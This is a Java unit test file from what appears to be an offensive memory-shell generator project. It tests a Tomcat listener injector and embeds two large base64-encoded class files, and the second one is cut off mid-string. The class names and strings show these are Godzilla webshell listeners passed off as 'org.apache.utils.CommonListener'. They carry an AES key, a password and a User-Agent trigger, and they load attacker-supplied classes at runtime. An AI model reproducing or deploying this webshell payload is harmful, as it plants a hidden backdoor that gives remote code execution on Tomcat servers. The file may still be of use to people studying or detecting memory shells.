package com.reajason.javaweb.memsell.tomcat.injector;

import com.reajason.javaweb.memsell.InjectorGenerator;
import com.reajason.javaweb.util.ClassUtils;
import com.reajason.javaweb.util.CommonUtil;
import lombok.SneakyThrows;
import org.apache.commons.codec.binary.Base64;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
class TomcatListenerInjectorTest {

    @Test
    @SneakyThrows
    void generate() {
        byte[] shellBytes = Base64.decodeBase64("yv66vgAAADQBSAoATAClCgBMAKYKAAQApwcAqAoAEwCpBwCqCgATAKsKAAYArAoArQCuCgCtAK8IALAKABMAsQgAsgcAswoAEwC0BwC1CgC2ALcIALgHALkHAHcHALoHALsIALwKABMAvQgAvggAvwgAwAgAwQgAwgoATADDCADECgDFAMYHAMcJADUAyAoAFQDJCgAhAMoKAMUAywoAxQDMCgDNAM4HAM8JADUA0AsAKADRCQA1ANIKABUA0woANQDUCwAoANUJADUA1gsAKADXCgA1ANgKADUA2QgA2gsA2wDcBwDdCgATAN4KADUApgoANQDfCwDbAOAIAOELACgA4AcA4goAPAClCgAEAOMLAEsA5AkANQDlCgAVAOYKAOcA6AoABADpCgA8AOoKADUA6woAFQDsCwBLAO0IAJoKADUA7ggAlQcA7wcA8AcA8QEAA21kNQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANrZXkBAApoZWFkZXJOYW1lAQALaGVhZGVyVmFsdWUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAP0xjb20vcmVhamFzb24vamF2YXdlYi9tZW1zZWxsL3RvbWNhdC9nb2R6aWxsYS9Hb2R6aWxsYUxpc3RlbmVyOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQANZ2V0RmllbGRWYWx1ZQEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEbmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAA1TdGFja01hcFRhYmxlBwDyBwC5BwCqAQAKRXhjZXB0aW9ucwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdlbmNvZGVyAQAGYmFzZTY0AQAEdmFyNgEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAmJzAQACW0IBAAV2YWx1ZQcAugcAuwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQAJU2lnbmF0dXJlAQAYKFtCKUxqYXZhL2xhbmcvQ2xhc3M8Kj47AQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAAXMBAAFtAQABWgcA3QcA8wEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsHAPQHAM8HAO8HAPUBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQABZQEAClNvdXJjZUZpbGUBABVHb2R6aWxsYUxpc3RlbmVyLmphdmEMAFQAVQwAVABbDAD2APcBABBqYXZhL2xhbmcvT2JqZWN0DAD4APkBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAPoA9wwAVAD7BwDyDAD8AP0MAP4A/wEAEGphdmEudXRpbC5CYXNlNjQMAQABAQEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMAQIBAwEAE1tMamF2YS9sYW5nL09iamVjdDsHAQQMAQUBBgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAEHAQgBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBCQEKAQADQUVTBwDzDAELAQwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDABRAE8MAQ0BDgwAVAEPDAEQAREMARIBEwcA9AwBFAEVAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwAUgBPDAEWARcMAFMATwwBGAEZDACgAKEMARoBGwwAUABPDAEcARcMAHsAfAwAgwCEAQAHcGF5bG9hZAcA9QwBHQEeAQA9Y29tL3JlYWphc29uL2phdmF3ZWIvbWVtc2VsbC90b21jYXQvZ29kemlsbGEvR29kemlsbGFMaXN0ZW5lcgwBHwEgDAB+AH8MASEBIgEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBIwEkDAElASYMAE4ATwwBJwEoBwEpDAEqAPsMASsBLAwBLQEODABwAHEMAScBLgwBLwBVDABeAF8BACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAIWphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcv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");
        String shellClassName = "org.apache.utils.CommonListener";
        String injectClassName = this.getClass().getName() + "1";
        byte[] bytes = InjectorGenerator.generate(TomcatListenerInjector.class, injectClassName, shellClassName, shellBytes, null);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(injectClassName, obj.getClass().getName());
        assertEquals(shellClassName, ClassUtils.invokeMethod(obj, "getClassName", null, null).toString());
        assertEquals(Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), ""),
                ClassUtils.invokeMethod(obj, "getBase64String", null, null).toString());
        System.out.println(Base64.encodeBase64String(bytes));
    }

    @Test
    @SneakyThrows
    void generateJakarta() {
        byte[] shellBytes = Base64.decodeBase64("yv66vgAAADQBRwoATACkCgBMAKUKAAQApgcApwoAEwCoBwCpCgATAKoKAAYAqwoArACtCgCsAK4IAK8KABMAsAgAsQcAsgoAEwCzBwC0CgC1ALYIALcHALgHAHcHALkHALoIALsKABMAvAgAvQgAvggAvwgAwAgAwQoATADCCADDCgDEAMUHAMYJADUAxwoAFQDICgAhAMkKAMQAygoAxADLCgDMAM0HAM4JADUAzwsAKADQCQA1ANEKABUA0goANQDTCwAoANQJADUA1QsAKADWCgA1ANcKADUA2AgA2QsA2gDbBwDcCgATAN0KADUApQoANQDeCwDaAN8IAOALACgA3wcA4QoAPACkCgAEAOILAEsA4wkANQDkCgAVAOUKAOYA5woABADoCgA8AOkKADUA6goAFQDrCwBLAOwIAJkKADUA7QgAkgcA7gcA7wcA8AEAA21kNQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANrZXkBAApoZWFkZXJOYW1lAQALaGVhZGVyVmFsdWUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEARkxjb20vcmVhamFzb24vamF2YXdlYi9tZW1zZWxsL3RvbWNhdC9nb2R6aWxsYS9Hb2R6aWxsYUpha2FydGFMaXN0ZW5lcjsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADWdldEZpZWxkVmFsdWUBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAA29iagEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABG5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcA8QcAuAcAqQEACkV4Y2VwdGlvbnMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHZW5jb2RlcgEABmJhc2U2NAEABHZhcjYBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJicwEAAltCAQAFdmFsdWUHALkHALoBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEACVNpZ25hdHVyZQEAGChbQilMamF2YS9sYW5nL0NsYXNzPCo+OwEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBAAFzAQABbQEAAVoHANwHAPIBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBACgoTGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAhyZXNwb25zZQEAKkxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB3Nlc3Npb24BACJMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEAE3NlcnZsZXRSZXF1ZXN0RXZlbnQBACVMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAHcmVxdWVzdAEAKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7BwDzBwDOBwDuBwD0AQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAVShMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAFlAQAKU291cmNlRmlsZQEAHEdvZHppbGxhSmFrYXJ0YUxpc3RlbmVyLmphdmEMAFQAVQwAVABbDAD1APYBABBqYXZhL2xhbmcvT2JqZWN0DAD3APgBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAPkA9gwAVAD6BwDxDAD7APwMAP0A/gEAEGphdmEudXRpbC5CYXNlNjQMAP8BAAEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMAQEBAgEAE1tMamF2YS9sYW5nL09iamVjdDsHAQMMAQQBBQEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvbGFuZy9FeGNlcHRpb24BABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAEGAQcBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBCAEJAQADQUVTBwDyDAEKAQsBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDABRAE8MAQwBDQwAVAEODAEPARAMAREBEgcA8wwBEwEUAQAnamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DABSAE8MARUBFgwAUwBPDAEXARgMAJ8AoAwBGQEaDABQAE8MARsBFgwAewB8DACDAIQBAAdwYXlsb2FkBwD0DAEcAR0BAERjb20vcmVhamFzb24vamF2YXdlYi9tZW1zZWxsL3RvbWNhdC9nb2R6aWxsYS9Hb2R6aWxsYUpha2FydGFMaXN0ZW5lcgwBHgEfDAB+AH8MASABIQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBIgEjDAEkASUMAE4ATwwBJgEnBwEoDAEpAPoMASoBKwwBLAENDABwAHEMASYBLQwBLgBVDABeAF8BAChqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAmamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE2phdmF4L2NyeXB0by9DaXBoZXIBACNqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudAEAIGpha2FydGEvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQARZ2V0U2VydmxldFJlcXVlc3QBACIoKUxqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEACmdldFNlc3Npb24BACQoKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAt0b0J5dGVBcnJheQEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2ZsdXNoQnVmZmVyAQAmb3JnL2FwYWNoZS91dGlscy9Db21tb25KYWthcnRhTGlzdGVuZXIHAS8IAFAJATAA1QEAEDNjNmUwYjhhOWMxNTIyNGEIATMJATAAxwEAIDExQ0Q2QTg3NTg5ODQxNjM2QzM3QUM4MjZBMkEwNEJDCAE2CQEwAOQBAApVc2VyLUFnZW50CAE5CQEwAM8BAAR0ZXN0CAE8CQEwANEBAChMb3JnL2FwYWNoZS91dGlscy9Db21tb25KYWthcnRhTGlzdGVuZXI7CgEwANMKATAA1woBMADYCgEwAKUKATAA3goBMADqCgEwAO0AIQEwAEwAAQBNAAUAAQBOAE8AAAABAFAATwAAAAEAUQBPAAAAAQBSAE8AAAABAFMATwAAAAkAAQBUAFUAAQBWAAAANAACAAEAAAAoKrcAASoTATG1ATIqEwE0tQE1KhMBN7UBOCoTATq1ATsqEwE9tQE+sQAAAAAAAQBUAFsAAQBWAAAANQACAAIAAAApKiu3AAIqEwExtQEyKhMBNLUBNSoTATe1ATgqEwE6tQE7KhMBPbUBPrEAAAAAACkAXgBfAAIAVgAAAOcAAwAFAAAAOAFNKrYAA04tEgSlABYtK7YABU2nAA06BC22AAdOp//qLMcADLsAblkrtwAIvywEtgAJLCq2AAqwAAEADQATABYAbgAEAGsAAAARAAT9AAcHAKwHAG1OBwBuCQwAVwAAADIADAAAACAAAgAhAAcAIgANACQAEwAlABYAJgAYACcAHQAoACAAKgAkACsALQAtADIALgBYAAAANAAFABgABQBgAGEABAAAADgAYgBjAAAAAAA4AGQATwABAAIANgBlAGYAAgAHADEAZwBoAAMAaQAAAAwAAQAHADEAZwBqAAMAbwAAAAQAAQB6AAkAcABxAAIAVgAAAWUABgAFAAAAeAFMEgu4AAxNLBINAcAADrYADywBwAAQtgARTi22AAMSEgS9AG1ZAxIUU7YADy0EvQAEWQMqU7YAEcAAeUynADlOEhe4AAxNLLYAGDoEGQS2AAMSGQS9AG1ZAxIUU7YADxkEBL0ABFkDKlO2ABHAAHlMpwAFOgQrsAACAAIAPQBAAHoAQQBxAHQAegAEAGsAAAApAAP/AEAAAgcAFAcAeQABBwB6/wAzAAQHABQHAHkABwB6AAEHAHr5AAEAVwAAADIADAAAADQAAgA3AAgAOAAbADkAPQBBAEAAOgBBADwARwA9AE0APgBxAEAAdAA/AHYAQgBYAAAASAAHABsAIgByAGMAAwAIADgAcwBoAAIATQAkAHIAYwAEAEcALQBzAGgAAgBBADUAdAB1AAMAAAB4AHYAdwAAAAIAdgB4AE8AAQBpAAAAFgACAAgAOABzAGoAAgBHAC0AcwBqAAIAbwAAAAQAAQB6AAk